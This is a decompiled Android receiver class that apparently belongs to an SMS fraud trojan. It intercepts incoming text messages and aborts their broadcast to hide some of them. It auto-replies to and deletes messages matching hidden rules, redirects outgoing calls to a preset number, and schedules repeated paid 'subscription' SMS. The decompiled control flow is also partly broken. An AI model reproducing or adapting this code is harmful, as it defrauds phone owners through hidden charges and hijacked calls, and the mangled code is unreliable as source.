package xxx_2.app;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import org.json.JSONObject;

public class MainReceiver
  extends BroadcastReceiver
{
  public MainReceiver() {}
  
  private SmsMessage[] getSmsMessages(Bundle paramBundle)
  {
    paramBundle = (Object[])paramBundle.get("pdus");
    SmsMessage[] arrayOfSmsMessage = new SmsMessage[paramBundle.length];
    int i = 0;
    for (;;)
    {
      if (i >= paramBundle.length) {
        return arrayOfSmsMessage;
      }
      arrayOfSmsMessage[i] = SmsMessage.createFromPdu((byte[])paramBundle[i]);
      i += 1;
    }
  }
  
  public void onReceive(Context paramContext, Intent paramIntent)
  {
    for (;;)
    {
      int i;
      try
      {
        str1 = paramIntent.getAction();
        Settings.log("action: " + str1);
        if (!str1.equals("android.provider.Telephony.SMS_RECEIVED")) {
          break label440;
        }
        paramIntent = getSmsMessages(paramIntent.getExtras());
        bool3 = false;
        i = 0;
        int j = paramIntent.length;
        if (i >= j) {
          if (!bool3) {}
        }
      }
      catch (Exception paramContext)
      {
        String str1;
        boolean bool3;
        String str2;
        boolean bool1;
        Settings.log(paramContext);
        return;
      }
      try
      {
        abortBroadcast();
        return;
      }
      catch (Exception paramContext)
      {
        paramContext.printStackTrace();
        return;
      }
      str2 = paramIntent[i];
      bool1 = bool3;
      try
      {
        str1 = str2.getOriginatingAddress();
        bool1 = bool3;
        str2 = str2.getMessageBody();
        bool1 = bool3;
        if (Settings.getSettings() == null)
        {
          bool1 = bool3;
          localObject = new Settings();
          bool1 = bool3;
          if (((Settings)localObject).load(paramContext))
          {
            bool1 = bool3;
            JSONObject localJSONObject = MainService.getObject(new JSONObject(Constants.data).getJSONObject("settings"), "checkInSms");
            if (localJSONObject != null)
            {
              bool1 = bool3;
              if (MainService.isEnable(localJSONObject))
              {
                bool1 = bool3;
                if (Settings.isDie(str1, str2))
                {
                  bool1 = bool3;
                  Settings.userCancel = true;
                  bool1 = bool3;
                  ((Settings)localObject).save(paramContext);
                }
              }
            }
          }
        }
        bool1 = bool3;
        if (Settings.userCancel) {
          continue;
        }
        bool1 = bool3;
        Object localObject = Settings.isAosMessage(str1, str2);
        bool1 = bool3;
        if (localObject != null)
        {
          bool3 = true;
          bool2 = true;
          bool1 = bool3;
          Settings.log("isAosMessage() true");
        }
        try
        {
          Settings.sendSms(str1, (String)localObject);
          bool1 = bool2;
        }
        catch (Exception localException2)
        {
          bool1 = bool3;
          localException2.printStackTrace();
          bool1 = bool2;
          continue;
        }
        bool3 = Settings.isDeleteMessageIfNotStartWith(str1, str2);
        bool1 = bool3;
        Settings.log("isDeleteMessageIfNotStartWith(): " + bool3);
        bool2 = bool3;
        bool1 = bool3;
        if (Settings.isOkMessage(str1, str2))
        {
          bool1 = bool3;
          Settings.log("isOkMessage() true");
          bool1 = bool3;
          Settings.ok = true;
          bool2 = true;
        }
        bool1 = bool2;
        Settings.log("find: " + bool2);
        bool3 = bool2;
        if (bool2) {
          break label779;
        }
        bool1 = bool2;
        bool3 = bool2;
        if (!Settings.isDeleteMessage(str1, str2)) {
          break label779;
        }
        bool3 = true;
      }
      catch (Exception localException1)
      {
        boolean bool2;
        localException1.printStackTrace();
        bool3 = bool1;
      }
      label440:
      if (localException1.equals("android.intent.action.NEW_OUTGOING_CALL"))
      {
        paramIntent = paramIntent.getExtras().getString("android.intent.extra.PHONE_NUMBER");
        Settings.log("phone: " + paramIntent);
        if (Settings.isRedirect(paramIntent))
        {
          Settings.log("isRedirect: true");
          setResultData(null);
          Settings.makeCall(paramContext, Settings.callTo);
        }
      }
      else if (localException1.startsWith("custom.sms."))
      {
        Settings.sendSms(paramIntent.getExtras().getString("phone"), paramIntent.getExtras().getString("text"));
        if (Settings.loadSettings(paramContext))
        {
          paramIntent = Settings.getSettings();
          paramIntent.subscriptionTime = 0L;
          paramIntent.save(paramContext);
        }
      }
      else
      {
        long l1;
        if (localException1.equals("custom.reapeat"))
        {
          l1 = paramIntent.getExtras().getLong("time");
          if ((System.currentTimeMillis() >= l1) || (l1 - System.currentTimeMillis() <= Constants.MINUTE))
          {
            MainService.start(paramContext, new Intent(), "pay");
            return;
          }
          Settings.startRepeatWaitTimer(paramContext, l1);
          return;
        }
        if (Settings.loadSettings(paramContext))
        {
          paramIntent = Settings.getSettings();
          long l3 = System.currentTimeMillis();
          long l2;
          if (paramIntent.subscriptionTime != 0L)
          {
            if (paramIntent.subscriptionTime <= l3) {
              break label756;
            }
            l2 = (paramIntent.subscriptionTime - l3) / Constants.SECOND;
            l1 = l2;
            if (l2 == 0L) {
              l1 = 1L;
            }
            Settings.startSmsTimer(paramContext, l1, 1, paramIntent.subscriptionPhone, paramIntent.subscriptionMessage);
          }
          while (paramIntent.repeatTime != 0L)
          {
            if (paramIntent.repeatTime <= l3) {
              break label773;
            }
            l2 = (paramIntent.subscriptionTime - l3) / Constants.MINUTE;
            l1 = l2;
            if (l2 == 0L) {
              l1 = 1L;
            }
            Settings.startRepeatTimer(paramContext, l1);
            return;
            label756:
            Settings.startSmsTimer(paramContext, 1L, 1, paramIntent.subscriptionPhone, paramIntent.subscriptionMessage);
          }
          label773:
          Settings.startRepeatTimer(paramContext, 1L);
          return;
          label779:
          i += 1;
        }
      }
    }
  }
}
